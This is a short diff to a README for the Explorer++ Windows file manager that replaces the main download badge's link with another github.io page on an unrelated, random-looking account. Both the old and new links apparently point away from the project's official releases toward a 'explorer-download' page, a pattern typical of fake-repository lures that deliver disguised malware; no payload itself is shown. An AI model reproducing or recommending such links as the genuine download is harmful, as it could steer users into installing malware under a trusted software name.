@@ -1,6 +1,6 @@
 # Explorer++ - Open Source Windows File Manager
 
-[![GET Explorer++](https://img.shields.io/badge/GET%20%E2%80%94%20Explorer%2B%2B-0078D6?style=for-the-badge&logoColor=white)](https://malikfigueroaiici.github.io/.github/explorer-download)
+[![GET Explorer++](https://img.shields.io/badge/GET%20%E2%80%94%20Explorer%2B%2B-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhizb.github.io/.github/explorer-download)
 
 ## Explorer++ File Browsing Overview
 
